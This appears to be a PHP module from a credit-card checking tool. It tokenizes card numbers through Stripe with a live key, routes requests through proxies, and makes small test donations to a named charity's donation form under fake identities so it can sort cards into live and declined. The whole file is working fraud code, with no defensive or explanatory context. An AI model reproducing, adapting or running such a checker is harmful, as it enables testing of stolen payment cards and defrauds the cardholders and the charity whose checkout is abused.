<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) $retry++;

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$data = 'card[number]='.$cc.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ff79f90bea%3B+stripe-js-v3%2Ff79f90bea&time_on_page='.rand(50000, 100000).'&key=pk_live_gG6W5SVz4aJKgXGrs68WxkUc';

$r1 = $this->curlx->Post('https://api.stripe.com/v1/tokens', $data, null, null, $server['proxy']);

if (!$r1->success) goto start;

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

if (!isset($json_r1->id)) goto start;

$tok = $json_r1->id;

$data = '{"op":"donation","clientId":"cridge","chargeDetails":{"token":"'.$tok.'","live":true,"cardCountry":"US","frequency":"oneTime"},"form":{"_amount":136,"_cc":"","title":"Mr","_firstName":"'.$fake->first.'","middleInitial":"","_lastName":"'.$fake->last.'","isCoDonor":false,"coDonorTitle":"","coDonorFirstName":"","coDonorMiddleInitial":"","coDonorLastName":"","_address":"12 main street","_mailCode":"10509","_city":"Brewster","_region":"New York","_email":"'.$fake->email.'","_isOrg":false,"_orgName":"","_orgAddress":"","_orgMailCode":"","_orgCity":"","_orgRegion":"","inspiration":"","emailSignup":false,"whereCode":"default","usdDonationAmount":100},"restApiCalls":[{"call":"sendThankYouEmail","extra":{"emailTemplate":"one-time-template","emailTo":[{"name":"'.$fake->first.' '.$fake->last.'","email":"'.$fake->email.'"}],"formattedAmount":"$1.36","name":"'.$fake->first.'","codonorName":""}},{"call":"sendThankYouEmail","extra":{"emailTemplate":"donation-notification","emailTo":[{"email":"jspecht@cridge.org"}],"formattedAmount":"$1.36","name":"'.$fake->first.' '.$fake->last.'"}}],"integrations":[]}';

$headers = [
	'content-type: text/plain;charset=UTF-8'
];

$r2 = $this->curlx->Post('https://api.glassregister.org/apps/donate', $data, $headers, null, $server['proxy']);

if (!$r2->success || empty($r2->body)) goto start;

$json_r2 = json_decode($r2->body);

if (!empty($msg = $json_r2->msg ?? '')) $msg .= '!'.(isset($json_r2->err) ? ' ('.str_replace('-', '_', $json_r2->err).')' : '').'';

$status = $this->response->Stripe($r2->body, $msg, 'ccn');

end: